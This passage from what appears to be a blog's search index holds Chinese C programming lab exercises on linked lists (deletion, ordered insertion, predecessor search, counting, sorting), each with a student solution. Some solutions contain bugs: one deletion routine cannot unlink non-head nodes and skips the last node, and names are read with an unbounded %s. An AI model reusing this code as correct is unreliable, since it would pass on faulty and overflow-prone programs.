classc;</span><br><span class="line">    double aver;</span><br><span class="line">    double sum;</span><br><span class="line">    struct stu *next;</span><br><span class="line">&#125;;</span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int n,i,dnum,flag;</span><br><span class="line">    struct stu *head,*q,*p;</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d&quot;</span>,&amp;n)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        flag=0;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            p=(struct stu *)malloc(sizeof(struct stu));</span><br><span class="line">            scanf(<span class="string">&quot;%u %s %lf %lf %lf&quot;</span>,&amp;p-&gt;num,p-&gt;name,&amp;p-&gt;classa,&amp;p-&gt;classb,&amp;p-&gt;classc);</span><br><span class="line">            p-&gt;sum=(p-&gt;classa+p-&gt;classb+p-&gt;classc);</span><br><span class="line">            p-&gt;aver=(p-&gt;sum)/3.0;</span><br><span class="line">            <span class="keyword">if</span>(i==0)</span><br><span class="line">                head=q=p;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                q-&gt;next=p;</span><br><span class="line">            q=p;</span><br><span class="line">            p-&gt;next=NULL;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        scanf(<span class="string">&quot;%d&quot;</span>,&amp;dnum);</span><br><span class="line">        p=head;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(p-&gt;next!=NULL)</span><br><span class="line">        &#123;</span><br><span class="line">            q=p;</span><br><span class="line">            <span class="keyword">if</span>(p-&gt;num==dnum)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(p==head)</span><br><span class="line">                &#123;</span><br><span class="line">                    head=p-&gt;next;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    q-&gt;next=p-&gt;next;</span><br><span class="line">                &#125;</span><br><span class="line">                flag=1;</span><br><span class="line">                <span class="built_in">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            p=p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag==0) <span class="built_in">printf</span>(<span class="string">&quot;Error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            p=head;</span><br><span class="line">            <span class="keyword">while</span>(p!=NULL)</span><br><span class="line">            &#123;</span><br><span class="line">               <span class="built_in">printf</span>(<span class="string">&quot;%u  %s  %.2lf  %.2lf  %.2lf  %.2lf  %.2lf\n&quot;</span>,p-&gt;num,p-&gt;name,p-&gt;classa,</span><br><span class="line">p-&gt;classb,p-&gt;classc,p-&gt;aver,p-&gt;sum);</span><br><span class="line">                p=p-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5、"><a href="#5、" class="headerlink" title="5、"></a>5、</h3><p>按照有序表的插入算法，建立一个有序的链表：根据第3题的思想，建立一个总成绩有序的链表，即从一个空的头结点开始，按照有序表的插入，逐个输入要插入的信息，依次插入到合适的位置，最终建立一个总成绩有序的链表，按照总成绩降序排列。<br>学生的信息包括：学号（unsigned int）、姓名（char [20]，不含空格）、3门课的成绩（double），平均成绩和总成绩，其中每个学生的平均成绩和总成绩由前面读入的数值通过计算得到（均保留2位小数）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">struct stu&#123;</span><br><span class="line">    unsigned int num;</span><br><span class="line">    char name[25];</span><br><span class="line">    double classa;</span><br><span class="line">    double classb;</span><br><span class="line">    double classc;</span><br><span class="line">    double aver;</span><br><span class="line">    double sum;</span><br><span class="line">    struct stu *next;</span><br><span class="line">&#125;;</span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int n,i,l;</span><br><span class="line">    unsigned findnum;</span><br><span class="line">    struct stu *head,*q,*p,*tp,*tq,*t;</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d&quot;</span>,&amp;n)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        head=(struct stu *)malloc(sizeof(struct stu));</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            p=(struct stu *)malloc(sizeof(struct stu));</span><br><span class="line">            scanf(<span class="string">&quot;%u %s %lf %lf %lf&quot;</span>,&amp;p-&gt;num,p-&gt;name,&amp;p-&gt;classa,&amp;p-&gt;classb,&amp;p-&gt;classc);</span><br><span class="line">            p-&gt;sum=(p-&gt;classa+p-&gt;classb+p-&gt;classc);</span><br><span class="line">            p-&gt;aver=(p-&gt;sum)/3.0;</span><br><span class="line">            <span class="keyword">if</span>(i==0)</span><br><span class="line">            &#123;</span><br><span class="line">                 head-&gt;next=p;</span><br><span class="line">                 p-&gt;next=NULL;</span><br><span class="line">                 q=p;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                tq=tp=head-&gt;next;</span><br><span class="line">                <span class="keyword">while</span>(tp!=NULL &amp;&amp; (tp-&gt;sum)&gt;(p-&gt;sum))</span><br><span class="line">                &#123;</span><br><span class="line">                    tq=tp;</span><br><span class="line">                    tp=tp-&gt;next;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(tp==head-&gt;next)&#123;</span><br><span class="line">                    t=head-&gt;next;</span><br><span class="line">                    head-&gt;next=p;</span><br><span class="line">                    p-&gt;next=t;</span><br><span class="line">                    q=t;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(tp==NULL)&#123;</span><br><span class="line">                    q-&gt;next=p;</span><br><span class="line">                    p-&gt;next=NULL;</span><br><span class="line">                    q=p;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    t=tq-&gt;next;</span><br><span class="line">                    tq-&gt;next=p;</span><br><span class="line">                    p-&gt;next=t;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        p=head-&gt;next;</span><br><span class="line">        <span class="keyword">while</span>(p)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%u  %s  %.2lf  %.2lf  %.2lf  %.2lf  %.2lf\n&quot;</span>,p-&gt;num,p-&gt;name,p-&gt;classa,</span><br><span class="line">p-&gt;classb,p-&gt;classc,p-&gt;aver,p-&gt;sum);</span><br><span class="line">            p=p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> 基础 </tag>
            
            <tag> 锐格 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C 语言实验 9</title>
      <link href="/2021/12/15/C-%E8%AF%AD%E8%A8%80%E5%AE%9E%E9%AA%8C-9/"/>
      <url>/2021/12/15/C-%E8%AF%AD%E8%A8%80%E5%AE%9E%E9%AA%8C-9/</url>
      
        <content type="html"><![CDATA[<h4 id="C语言-锐格实验"><a href="#C语言-锐格实验" class="headerlink" title="C语言 锐格实验"></a>C语言 锐格实验</h4><h5 id="九-链表2-基本访问操作"><a href="#九-链表2-基本访问操作" class="headerlink" title="九.链表2-基本访问操作"></a>九.链表2-基本访问操作</h5><h3 id="1、"><a href="#1、" class="headerlink" title="1、"></a>1、</h3><p>查找指定结点的前驱。利用前面学到的尾插法创建链表的方法，建立一个具有n个结点的单链表，之后输入一个整数x，查找x在链表中的前驱结点是哪个？若x是第一个结点，则输出“没有前驱”，如果x不存在，则输出“x不存在”。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">struct table&#123;</span><br><span class="line">    int num;</span><br><span class="line">    struct table* next;</span><br><span class="line">&#125;;</span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int n,i;</span><br><span class="line">    int findnum,flag;</span><br><span class="line">    struct table *head,*p,*q;</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d&quot;</span>,&amp;n)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        flag=0;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            p=(struct table *)malloc(sizeof(struct table));</span><br><span class="line">            scanf(<span class="string">&quot;%d&quot;</span>,&amp;p-&gt;num);</span><br><span class="line">            <span class="keyword">if</span>(i==0)</span><br><span class="line">                head=q=p;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                q-&gt;next=p;</span><br><span class="line">            q=p;</span><br><span class="line">            p-&gt;next=NULL;</span><br><span class="line">        &#125;</span><br><span class="line">        scanf(<span class="string">&quot;%d&quot;</span>,&amp;findnum);</span><br><span class="line">        q=p=head;</span><br><span class="line">        <span class="keyword">while</span>(p!=NULL)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(p-&gt;num==findnum)</span><br><span class="line">            &#123;</span><br><span class="line">                flag=1;</span><br><span class="line">                <span class="keyword">if</span>(p==head)&#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;没有前驱\n&quot;</span>);</span><br><span class="line">                    <span class="built_in">break</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,q-&gt;num);</span><br><span class="line">                    <span class="built_in">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            q=p;</span><br><span class="line">            p=p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag==0) <span class="built_in">printf</span>(<span class="string">&quot;x不存在\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="2、"><a href="#2、" class="headerlink" title="2、"></a>2、</h3><p>查找链表中有多少个值为偶数的结点。利用前面学到的头插法创建链表的方法，建立一个具有n个结点的单链表，之后统计一下该链表中有多少个值为偶数的结点。有则输出个数，没有则输出0。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">struct table&#123;</span><br><span class="line">    int num;</span><br><span class="line">    struct table *next;</span><br><span class="line">&#125;;</span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int i,n;</span><br><span class="line">    struct table *head,*q,*p;</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d&quot;</span>,&amp;n)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            p=(struct table *)malloc(sizeof(struct table));</span><br><span class="line">            scanf(<span class="string">&quot;%d&quot;</span>,&amp;p-&gt;num);</span><br><span class="line">            <span class="keyword">if</span>(i==0)</span><br><span class="line">                head=q=p;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                q-&gt;next=p;</span><br><span class="line">            q=p;</span><br><span class="line">            p-&gt;next=NULL;</span><br><span class="line">        &#125;</span><br><span class="line">        p=head;</span><br><span class="line">        int num=0;</span><br><span class="line">        <span class="keyword">while</span>(p!=NULL)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>((p-&gt;num)%2==0) num++;</span><br><span class="line">            p=p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,num);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3、"><a href="#3、" class="headerlink" title="3、"></a>3、</h3><p>删除所有结点值为x的结点。利用前面学到的尾插法创建链表的方法，建立一个具有n个结点的单链表，之后删除其中所有值为x的结点（设x有多个）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">struct table&#123;</span><br><span class="line">    int num;</span><br><span class="line">    struct table *next;</span><br><span class="line">&#125;;</span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int i,n;</span><br><span class="line">    struct table *head,*q,*p;</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d&quot;</span>,&amp;n)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            p=(struct table *)malloc(sizeof(struct table));</span><br><span class="line">            scanf(<span class="string">&quot;%d&quot;</span>,&amp;p-&gt;num);</span><br><span class="line">            <span class="keyword">if</span>(i==0)</span><br><span class="line">                head=q=p;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                q-&gt;next=p;</span><br><span class="line">            q=p;</span><br><span class="line">            p-&gt;next=NULL;</span><br><span class="line">        &#125;</span><br><span class="line">        int deletenum;</span><br><span class="line">        scanf(<span class="string">&quot;%d&quot;</span>,&amp;deletenum);</span><br><span class="line">        q=p=head;</span><br><span class="line">        <span class="keyword">while</span>(p!=NULL)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(p-&gt;num==deletenum)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(p==head)&#123;</span><br><span class="line">                    head=head-&gt;next;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    q-&gt;next=p-&gt;next;</span><br><span class="line">                    p=p-&gt;next;</span><br><span class="line">                    <span class="built_in">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            q=p;</span><br><span class="line">            p=p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,head-&gt;num);</span><br><span class="line">        p=head-&gt;next;</span><br><span class="line">        <span class="keyword">while</span>(p!=NULL)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;  %d&quot;</span>,p-&gt;num);</span><br><span class="line">            p=p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4、"><a href="#4、" class="headerlink" title="4、"></a>4、</h3><p>利用尾插法建立一个递增有序的链表，（输入值有序即可），之后在这个链表中插1个x值，使链表仍然有序。利用前面学到的尾插法创建链表的方法，建立一个具有n个结点的递增有序的单链表，（此处使输入的数值递增有序即可），之后再输入一个整数x，将x插入到上述链表的合适的位置上，使得链表仍然有序。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">struct table&#123;</span><br><span class="line">    int num;</span><br><span class="line">    struct table *next;</span><br><span class="line">&#125;;</span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int i,n;</span><br><span class="line">    struct table *head,*q,*p,*t;</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d&quot;</span>,&amp;n)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            p=(struct table *)malloc(sizeof(struct table));</span><br><span class="line">            scanf(<span class="string">&quot;%d&quot;</span>,&amp;p-&gt;num);</span><br><span class="line">            <span class="keyword">if</span>(i==0)</span><br><span class="line">                head=q=p;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                q-&gt;next=p;</span><br><span class="line">            q=p;</span><br><span class="line">            p-&gt;next=NULL;</span><br><span class="line">        &#125;</span><br><span class="line">        int insertnum;</span><br><span class="line">        scanf(<span class="string">&quot;%d&quot;</span>,&amp;insertnum);</span><br><span class="line">        q=p=head;</span><br><span class="line">        <span class="keyword">while</span>(p!=NULL)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(p-&gt;num&gt;insertnum)</span><br><span class="line">            &#123;</span><br><span class="line">                t=(struct table *)malloc(sizeof(struct table));</span><br><span class="line">                t-&gt;num=insertnum;</span><br><span class="line">                <span class="keyword">if</span>(p==head)&#123;</span><br><span class="line">                    t-&gt;num=head-&gt;num;</span><br><span class="line">                    head-&gt;num=insertnum;</span><br><span class="line">                    t-&gt;next=head-&gt;next;</span><br><span class="line">                    head-&gt;next=t;</span><br><span class="line">                    <span class="built_in">break</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    t-&gt;next=q-&gt;next;</span><br><span class="line">                    q-&gt;next=t;</span><br><span class="line">                    <span class="built_in">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(p-&gt;next==NULL &amp;&amp; insertnum&gt;p-&gt;num)</span><br><span class="line">            &#123;</span><br><span class="line">                t=(struct table *)malloc(sizeof(struct table));</span><br><span class="line">                t-&gt;num=insertnum;</span><br><span class="line">                t-&gt;next=NULL;</span><br><span class="line">                p-&gt;next=t;</span><br><span class="line">                <span class="built_in">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            q=p;</span><br><span class="line">            p=p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        p=head-&gt;next;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,head-&gt;num);</span><br><span class="line">        <span class="keyword">while</span>(p!=NULL)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;  %d&quot;</span>,p-&gt;num);</span><br><span class="line">            p=p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5、"><a href="#5、" class="headerlink" title="5、"></a>5、</h3><p>利用第4题中有序表插入数值的思想，编写程序，从空链表开始，逐个插入结点，最终建立一个递增有序的链表。完成输入和输出函数。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">struct stu&#123;</span><br><span class="line">    int num;</span><br><span class="line">    struct stu *next;</span><br><span class="line">&#125;;</span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int n,i,j,t;</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d&quot;</span>,&amp;n)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        struct stu *head,*p,*q;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            p=(struct stu *)malloc(sizeof(struct stu));</span><br><span class="line">            scanf(<span class="string">&quot;%d&quot;</span>,&amp;p-&gt;num);</span><br><span class="line">            <span class="keyword">if</span>(i==0)</span><br><span class="line">                head=q=p;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                q-&gt;next=p;</span><br><span class="line">            q=p;</span><br><span class="line">            p-&gt;next=NULL;</span><br><span class="line">        &#125;</span><br><span class="line">        p=q=head;</span><br><span class="line">        <span class="keyword">while</span>(p)</span><br><span class="line">        &#123;</span><br><span class="line">            q=p-&gt;next;</span><br><span class="line">            <span class="keyword">while</span>(q)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(q-&gt;num&lt;p-&gt;num)</span><br><span class="line">                &#123;</span><br><span class="line">                    t=q-&gt;num;</span><br><span class="line">                    q-&gt;num=p-&gt;num;</span><br><span class="line">                    p-&gt;num=t;</span><br><span class="line">                &#125;</span><br><span class="line">                q=q-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            p=p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        p=head-&gt;next;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,head-&gt;num);</span><br><span class="line">        <span class="keyword">while</span>(p)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;  %d&quot;</span>,p-&gt;num);</span><br><span class="line">            p=p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> 基础 </tag>
            
            <tag> 锐格 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C 语言实验 8</title>
      <link href="/2021/12/15/C-%E8%AF%AD%E8%A8%80%E5%AE%9E%E9%AA%8C-8/"/>
      <url>/2021/12/15/C-%E8%AF%AD%E8%A8%80%E5%AE%9E%E9%AA%8C-8/</url>
      
